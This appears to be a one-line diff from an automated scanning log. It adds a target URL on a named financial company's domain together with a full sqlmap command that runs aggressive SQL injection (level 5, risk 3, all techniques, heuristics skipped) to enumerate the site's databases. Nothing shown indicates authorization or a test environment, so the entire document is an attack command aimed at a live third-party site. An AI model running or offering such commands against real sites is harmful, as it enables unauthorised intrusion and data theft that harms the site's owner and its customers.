@@ -1,0 +1,1 @@
+https://www.infinitycapital.bh/?zzz=1 (GET)  # /usr/bin/sqlmap -u https://www.infinitycapital.bh/?zzz=1 --batch --level=5 --risk=3 --dbs --threads=4 --output-dir=tool_outputs/ph/sm_3 -p zzz --technique=BEUSTQ --skip-heuristic
